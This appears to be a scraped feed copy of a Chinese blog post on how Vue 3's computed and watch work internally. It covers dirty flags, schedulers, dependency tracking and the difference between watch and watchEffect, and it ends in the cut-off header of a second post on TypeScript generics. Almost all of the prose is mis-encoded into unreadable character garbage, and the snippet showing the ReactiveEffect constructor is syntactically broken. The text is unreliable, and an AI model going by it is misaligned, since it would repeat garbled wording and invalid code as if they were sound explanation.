<p>å­¦è¿‡ä¸Šä¸€èŠ‚ refã€reactiveã€effect åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¢ç©¶å“åº”å¼å˜é‡çš„ä½¿ç”¨â€”â€”computed å’Œ watch ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€computed å’Œ watch æ¦‚è¿°</h2>
<p>æ‰€æœ‰å“åº”å¼é€»è¾‘éƒ½ä¼šä¾èµ– effect æ‰§è¡Œï¼Œcomputed / watch / render æœ¬è´¨éƒ½æ˜¯ effectã€‚</p>
<blockquote>
<ul>
<li>effectï¼šä¾èµ– stateã€‚</li>
<li>depï¼šè¢«å¤–éƒ¨ effect ä¾èµ–ã€‚</li>
</ul>
</blockquote>
<ul>
<li>â€‹<strong>computed</strong>â€‹ï¼š<em>å¸¦ç¼“å­˜çš„ã€æƒ°æ€§çš„ã€åŸºäºä¾èµ–çš„æ´¾ç”Ÿ effect</em></li>
<li>â€‹<strong>watch</strong>â€‹ï¼š<em>ä¸»åŠ¨ç›‘å¬æ•°æ®å˜åŒ–çš„å‰¯ä½œç”¨è°ƒåº¦å™¨</em></li>
</ul>
<p>ä¸€å¥è¯æ€»ç»“äºŒè€…çš„ç”±æ¥ï¼š</p>
<blockquote>
<p><strong>å‰¯ä½œç”¨ï¼ˆwatchï¼‰ä¸å¯ç¼“å­˜ï¼Œæ´¾ç”Ÿå€¼ï¼ˆcomputedï¼‰å¿…é¡»ç¼“å­˜</strong></p>
</blockquote>
<ul>
<li>computedï¼š <code>_dirty + scheduler</code></li>
<li>watch / watchEffectï¼š ç›´æ¥æ‰§è¡Œå‰¯ä½œç”¨</li>
</ul>
<h2 data-id="heading-1">äºŒã€computed çš„åº•å±‚å®ç°</h2>
<h3 data-id="heading-2">2.1 computed çš„æ ¸å¿ƒç»“æ„</h3>
<p>æºç ä¸­ <code>computed</code> è¿”å›çš„æ˜¯ä¸€ä¸ª â€‹<strong>ComputedRefImpl å®ä¾‹</strong>â€‹ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputedRefImpl</span> {
  _value
  dep
  effect
  _dirty = <span class="hljs-literal">true</span>
}
</code></pre>
<blockquote>
<p>å¯ä»¥ç†è§£ä¸ºï¼š<strong>computed = ref + effect + dirty æ ‡è®°</strong></p>
</blockquote>
<h3 data-id="heading-3">2.2 computed çš„åˆ›å»ºæµç¨‹</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">computed</span>(<span class="hljs-params">getter</span>) {
  <span class="hljs-keyword">const</span> cRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComputedRefImpl</span>(getter)
  <span class="hljs-keyword">return</span> cRef
}
</code></pre>
<p>æ„é€ å‡½æ•°å†…éƒ¨æ ¸å¿ƒé€»è¾‘ï¼ˆç®€åŒ–ï¼‰ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReactiveEffect</span>(getter, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">return</span> <span class="hljs-title function_">getter</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>), <span class="hljs-comment">// getterï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æˆ‘ä»¬ computed è°ƒç”¨æ˜¯ä¼ é€’çš„ fn å‚æ•°</span>
  <span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">// setter</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">true</span>
      <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-variable language_">this</span>)
    }
  }
})
</code></pre>
<blockquote>
<p>ğŸš¨ <strong>â€‹computed è‡ªå·±ä¸ä¼šé‡æ–°è®¡ç®—ï¼Œâ€‹</strong>å®ƒåªä¼šåœ¨ã€Œä¾èµ–å˜äº†ï¼ˆcomputedEffect.schedulerï¼‰ã€æ—¶ï¼ŒæŠŠ <code>_dirty</code> æ ‡è®°ä¸º <code>true</code>ã€‚</p>
<p>è€ŒçœŸæ­£é‡æ–°è®¡ç®—æ˜¯åœ¨ effect() æ—¶ï¼Œè§¦å‘äº†å“åº”å¼å˜é‡çš„ getterï¼ˆå¹¶ä¸”ä¸ºè„æ•°æ®ï¼‰ï¼Œç„¶åæ‰è®¡ç®— computedEffect.run() ã€‚</p>
</blockquote>
<h3 data-id="heading-4">2.3 computed.value çš„ getter</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
  <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-variable language_">this</span>)

  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">false</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span>.<span class="hljs-title function_">run</span>()
  }

  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>
}
</code></pre>
<h4 data-id="heading-5">2.3.1 ä¾èµ–æ”¶é›†çš„æ˜¯ã€Œcomputed æœ¬èº«ã€</h4>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title function_">trackRefValue</span>(<span class="hljs-variable language_">this</span>)
</code></pre>
<blockquote>
<p>ä¾èµ–é¦–å…ˆæ”¶é›†çš„ä¸æ˜¯ track getter é‡Œçš„å“åº”å¼æ•°æ®ï¼Œè€Œæ˜¯ï¼š<strong>â€œè°ç”¨åˆ°äº†è¿™ä¸ª computedâ€</strong></p>
</blockquote>
<h4 data-id="heading-6">2.3.2 computed æ˜¯æƒ°æ€§æ‰§è¡Œçš„</h4>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span>.<span class="hljs-title function_">run</span>()
}
</code></pre>
<ul>
<li>ä¾èµ–å˜äº†<strong>ä¸ä¼šç«‹åˆ»</strong>é‡æ–°è®¡ç®—</li>
<li><strong>åªæœ‰ â€‹<code>.value</code><strong>â€‹</strong>â€‹ è¢«è®¿é—®æ—¶æ‰é‡æ–°ç®—</strong></li>
</ul>
<h4 data-id="heading-7">2.3.3 computed ä¸€å®šæœ‰ç¼“å­˜</h4>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">false</span>
<span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>
</code></pre>
<p>åªè¦ä¾èµ–æ²¡å˜ï¼Œå¤šæ¬¡è®¿é—® <code>computedValue.value</code>ï¼Œ<strong>getter åªæ‰§è¡Œä¸€æ¬¡ã€‚</strong></p>
<h3 data-id="heading-8">2.4 computed çš„å®Œæ•´æ‰§è¡Œé“¾è·¯</h3>
<pre><code class="hljs language-Plain" lang="Plain">state.a æ”¹å˜
   â†“
computed.effect.scheduler æ‰§è¡Œ
   â†“
_dirty = trueï¼ˆä¸ä¼šç«‹åˆ»ç®—ï¼‰
   â†“
ä¸‹ä¸€æ¬¡è®¿é—® computed.value
   â†“
effect.run() â†’ é‡æ–°è®¡ç®—ï¼ˆâ€œè¢«åŠ¨â€è®¡ç®—ï¼‰
</code></pre>
<h3 data-id="heading-9">2.5 computed ç»“åˆå“åº”å¼å˜é‡çš„æ‰§è¡Œè¿‡ç¨‹</h3>
<h4 data-id="heading-10">2.5.1 è¿‡ç¨‹æ¦‚è¿°</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> })

<span class="hljs-keyword">const</span> c = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> state.<span class="hljs-property">a</span> + <span class="hljs-number">1</span>)

<span class="hljs-title function_">effect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c.<span class="hljs-property">value</span>)
})
</code></pre>
<pre><code class="hljs language-JavaScript" lang="JavaScript">state.<span class="hljs-property">a</span>++
 â†“
trigger state.<span class="hljs-property">a</span>.<span class="hljs-property">dep</span>
 â†“
computed.<span class="hljs-property">effect</span>.<span class="hljs-property">scheduler</span>
 â†“
computed.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">true</span>
 â†“
trigger computed.<span class="hljs-property">dep</span>
 â†“
render effect run
 â†“
computed.<span class="hljs-property">value</span> è¢«è®¿é—®
 â†“
computed.<span class="hljs-property">effect</span>.<span class="hljs-title function_">run</span>()  â† çœŸæ­£è®¡ç®—
</code></pre>
<blockquote>
<p>çœ‹ä¼¼å¾ˆå¤æ‚ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ª å‰¯ä½œç”¨æ”¶é›†è§¦å‘çš„åµŒå¥—é€»è¾‘ã€‚</p>
<p><strong>â€‹ğŸ«¡ä¸€å¥è¯æ€»ç»“ï¼šâ€‹</strong>å…¨å±€ effect æ‰§è¡Œï¼Œæ”¶é›†ä¾èµ–â€œå“åº”å¼å˜é‡â€ï¼ˆcomputed å˜é‡ + ref/reactive å˜é‡ï¼‰ï¼Œç„¶å computed å“åº”å¼å˜é‡åˆä¾èµ–äº ref/reactive å˜é‡ï¼ŒæŠŠä»–ä»¬æ”¶é›†åˆ° computed å˜é‡è‡ªèº«çš„ effect ä¸­ã€‚ç„¶åä¸€æ—¦  ref/reactive å˜é‡æ›´æ–°ï¼Œé‚£ä¹ˆé¦–å…ˆè§¦å‘è‡ªèº« trigger æ›´æ–°ï¼Œç„¶åè¢«ä¾èµ–çš„ computed effect çš„ trigger æ›´æ–°ï¼Œè¿›è€Œæœ€ç»ˆçš„ computed å˜é‡æ›´æ–°ï¼ˆâ€œæ‡’æ›´æ–°â€ï¼šç”¨åˆ°çš„æ—¶å€™æ‰ runï¼‰ã€‚</p>
</blockquote>
<h4 data-id="heading-11">2.5.2 è¿‡ç¨‹è®²è§£</h4>
<blockquote>
<p>computed å’Œ ref/reactive å®ä¾‹åˆå§‹åŒ–è¿‡ç¨‹ä¹‹å‰å·²ç»è¯¦ç»†è®²è§£è¿‡ï¼Œè¿™é‡Œä¸å†é‡å¤è®²è§£ã€‚</p>
</blockquote>
<p>computed ä¾èµ–æ”¶é›†è¿‡ç¨‹ï¼š</p>
<ol>
<li>effect æ‰§è¡Œï¼Œè®¿é—® computed.value</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript">effect
   â†“
computed.<span class="hljs-property">dep</span>.<span class="hljs-title function_">add</span>(effect)
</code></pre>
<ol start="2">
<li>computed.effect.run()ï¼Œè§¦å‘ computed çš„ getterï¼Œè¿›è€Œè§¦å‘ <code>state(.a)</code> çš„ getter</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript">state.<span class="hljs-property">a</span>
  â†“
computed.<span class="hljs-property">effect</span>
  â†“
computed.<span class="hljs-property">dep</span>
  â†“
effect
</code></pre>
<ol start="3">
<li><code>state.a</code> æ”¹å˜ï¼Œè§¦å‘ <code>state.a</code> çš„ trigger</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">trigger</span>(target, <span class="hljs-string">'a'</span>)
=&gt;  dep = state.<span class="hljs-property">a</span>.<span class="hljs-property">dep</span>
=&gt;  computed.<span class="hljs-property">effect</span>
</code></pre>
<ol start="4">
<li>æ‰§è¡Œ computed.effect.schedulerï¼ˆæ­¤æ—¶å¹¶ä¸æ˜¯ runï¼ï¼‰</li>
</ol>
<blockquote>
<p>å†…éƒ¨æ‰§è¡Œ scheduler çš„æ—¶å€™ï¼Œä¹‹åä¼šå›å¤´æ‰§è¡Œ _effect.run() ï¼Œä¹Ÿå°±ç›¸å½“äºæ‰§è¡Œäº† fn() ã€‚</p>
</blockquote>
<pre><code class="hljs language-JavaScript" lang="JavaScript">scheduler = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">true</span> <span class="hljs-comment">// æ‰“æ ‡è®°</span>
    <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-variable language_">this</span>) <span class="hljs-comment">// é lazy ä¸‹æ‰èƒ½åœ¨è¿™é‡Œå†…éƒ¨æ‰§è¡Œ run</span>
  }
}
</code></pre>
<ol start="5">
<li>triggerRefValue(this) ç­‰ä»·äº</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript">computed.<span class="hljs-property">dep</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> effect.<span class="hljs-title function_">run</span>()) <span class="hljs-comment">// é€šçŸ¥â€œè°ä¾èµ– computedâ€</span>
</code></pre>
<ol start="6">
<li>render effect é‡æ–°æ‰§è¡Œï¼Œå†æ¬¡è®¿é—® computed.value</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">effect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c.<span class="hljs-property">value</span>)
})
<span class="hljs-comment">// ç„¶åæ‰è®¿é—® computed.value</span>
<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span>.<span class="hljs-title function_">run</span>() <span class="hljs-comment">// computed è¿™æ—¶å€™æ‰çœŸæ­£é‡æ–°è®¡ç®—</span>
}
</code></pre>
<h4 data-id="heading-12">2.5.3 è¯¯åŒºè§£ç­”</h4>
<ol>
<li>ä¸ºä»€ä¹ˆ computed ä¸ç›´æ¥ runï¼Ÿ</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript">âŒ å¦‚æœ state æ”¹ä¸€æ¬¡ï¼Œcomputed ç«‹åˆ»ç®—ä¸€æ¬¡ï¼š
å¤šä¸ª state è¿ç»­å˜æ›´ â†’ é‡å¤è®¡ç®—
computed å¯èƒ½æ ¹æœ¬æ²¡äººç”¨
âœ… å»¶è¿Ÿåˆ° .<span class="hljs-property">value</span> è®¿é—®ï¼š
æƒ°æ€§
åˆå¹¶æ›´æ–°
æ€§èƒ½æœ€ä¼˜
</code></pre>
<ol start="2">
<li>ä¸ºä»€ä¹ˆ computed éœ€è¦è‡ªå·±çš„ depï¼Ÿ</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">effect</span>(<span class="hljs-function">() =&gt;</span> c.<span class="hljs-property">value</span>)
å¦‚æœ computed æ²¡æœ‰ depï¼š
å¤–éƒ¨ effect æ— æ³•è¢«è§¦å‘
computed æ›´æ–°æ— æ³•ä¼ æ’­
computed æœ¬èº«å°±æ˜¯ä¸€ä¸ªâ€œå¯ä¾èµ–å¯¹è±¡â€
</code></pre>
<h3 data-id="heading-13">2.6 computed ä¸ºä»€ä¹ˆä¸ç›´æ¥åšå‰¯ä½œç”¨ï¼Ÿ</h3>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(state.<span class="hljs-property">count</span>)
})
</code></pre>
<p>effect æ˜¯å‰¯ä½œç”¨å‡½æ•°ï¼Œè€Œ computed ç›¸è¾ƒäº effect çš„åŒºåˆ«ï¼š</p>
<ul>
<li>computed <strong>å¯èƒ½æ°¸è¿œä¸æ‰§è¡Œ</strong></li>
<li>computed <strong>å¯èƒ½è¢«ç¼“å­˜</strong></li>
<li>computed <strong>åªä¿è¯ value æ­£ç¡®ï¼Œä¸ä¿è¯å‰¯ä½œç”¨æ‰§è¡Œ</strong></li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥æŠŠ computed ä½œä¸ºå‰¯ä½œç”¨å‡½æ•°ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-14">ä¸‰ã€watch çš„åº•å±‚å®ç°</h2>
<h3 data-id="heading-15">3.1 watch çš„æœ¬è´¨</h3>
<blockquote>
<p><strong>watch = æ‰‹åŠ¨åˆ›å»º effect + è‡ªå®šä¹‰ scheduler</strong></p>
</blockquote>
<p>Vue3 ä¸­æ‰€æœ‰ watch/watchEffect æœ€ç»ˆéƒ½ä¼šèµ°åˆ°ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title function_">doWatch</span>(source, cb, options)
</code></pre>
<h3 data-id="heading-16">3.2 watch çš„ effect æ˜¯â€œéæƒ°æ€§â€çš„</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">const</span> effect = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReactiveEffect</span>(getter, scheduler)
</code></pre>
<ul>
<li>watch çš„ effect <strong>é»˜è®¤ç«‹åˆ»æ”¶é›†ä¾èµ–</strong></li>
<li>åç»­åªè¦ä¾èµ–å˜ï¼Œå°±è¿›å…¥ scheduler</li>
</ul>
<h3 data-id="heading-17">3.3 watch çš„ getter æ˜¯æ€ä¹ˆç”Ÿæˆçš„ï¼Ÿ</h3>
<h4 data-id="heading-18">æƒ…å†µä¸€ï¼šwatch ref</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">watch</span>(count, cb)
</code></pre>
<p>getter å®é™…æ˜¯ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript">() =&gt; count.<span class="hljs-property">value</span>
</code></pre>
<h4 data-id="heading-19">æƒ…å†µäºŒï¼šwatch reactive</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">watch</span>(state, cb)
</code></pre>
<p>getter å®é™…æ˜¯ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript">() =&gt; <span class="hljs-title function_">traverse</span>(state) <span class="hljs-comment">// æ·±åº¦ï¼ˆdeepï¼‰ç›‘å¬æ¯ä¸€ä¸ªå±æ€§ï¼Œå¼ºåˆ¶è§¦å‘æ‰€æœ‰ getter â†’ æ”¶é›†æ‰€æœ‰ä¾èµ–</span>
</code></pre>
<h3 data-id="heading-20">3.4 watch çš„ schedulerï¼ˆçœŸæ­£æ‰§è¡Œ cbï¼‰</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">job</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> newValue = effect.<span class="hljs-title function_">run</span>()
  <span class="hljs-title function_">cb</span>(newValue, oldValue) <span class="hljs-comment">// åœ¨ä¸‹æ¬¡è§¦å‘æ›´æ–°æ—¶ï¼Œå¯¹å›è°ƒå‡½æ•°åšè°ƒåº¦æ‰§è¡Œ</span>
  oldValue = newValue
}
</code></pre>
<p>è°ƒåº¦æ—¶æœºç”± <code>flush</code> å†³å®šï¼š</p>
<h3 data-id="heading-21">3.5 watch vs watchEffect çš„åŒºåˆ«</h3>
<blockquote>
<p>éå¸¸å»ºè®®ç›´æ¥çœ‹æºç ï¼Œè¿™é‡Œ AI ç”±äºä¸äº†è§£æºç ï¼Œç»å¸¸ä¼šäº§ç”Ÿä¸€äº›è¯¯å¯¼æ€§çš„â€œå‘è¨€â€ã€‚</p>
</blockquote>
<blockquote>
<p><strong>watchEffect æœ¬è´¨æ˜¯ï¼šæ²¡æœ‰å›è°ƒå‡½æ•°ï¼Œåªæœ‰ source(fn) çš„ watchã€‚</strong></p>
</blockquote>
<p>watch çš„å‰¯ä½œç”¨ä¸æ˜¯ getterï¼Œè€Œæ˜¯ cb</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">job = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> newValue = effect.<span class="hljs-title function_">run</span>()
  <span class="hljs-title function_">cb</span>(newValue, oldValue)
}
</code></pre>
<p>ä¾èµ–æ”¶é›†å’Œå‰¯ä½œç”¨æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> state.<span class="hljs-property">a</span>,
  <span class="hljs-function">(<span class="hljs-params">newVal, oldVal</span>) =&gt;</span> { <span class="hljs-comment">/* å‰¯ä½œç”¨ */</span> }
)
ä¾èµ–æ”¶é›†ï¼š
effect.<span class="hljs-title function_">run</span>()
 â†“
æ‰§è¡Œ getterï¼š() =&gt; state.<span class="hljs-property">a</span>
 â†“
<span class="hljs-title function_">track</span>(state, <span class="hljs-string">'a'</span>)

å‰¯ä½œç”¨æ‰§è¡Œï¼š
state.<span class="hljs-property">a</span> æ”¹å˜
 â†“
trigger
 â†“
scheduler
 â†“
<span class="hljs-title function_">job</span>()
 â†“
<span class="hljs-title function_">cb</span>(newVal, oldVal)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript æ³›å‹å®Œå…¨æŒ‡å—ï¼šå†™æ³•ã€å››å¤§åº”ç”¨åœºæ™¯ä¸é«˜çº§ç”¨æ³•]]></title>    <link>https://juejin.cn/post/7596919439019245577</link>    <guid>https://juejin.cn/post/7596919439019245577</guid>    <pubDate>2026-01-19T14:39:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596919439019245577" data-draft-id="7596904122865549363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript æ³›å‹å®Œå…¨æŒ‡å—ï¼šå†™æ³•ã€å››å¤§åº”ç”¨åœºæ™¯ä¸é«˜çº§ç”¨æ³•"/> <meta itemprop="keywords" content="TypeScript,Vue.js"/> <meta itemprop="datePublished" content="2026-01-19T14:39:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¦‚æœä½ å¥½"/> <meta itemprop="url" content="https://juejin.cn/user/2272012281328215"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript æ³›å‹å®Œå…¨æŒ‡å—ï¼šå†™æ³•ã€å››å¤§åº”ç”¨åœºæ™¯ä¸é«˜çº§ç”¨æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2272012281328215/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¦‚æœä½ å¥½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T14:39:12.000Z" title="Mon Jan 19 2026 14:39:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TypeScript 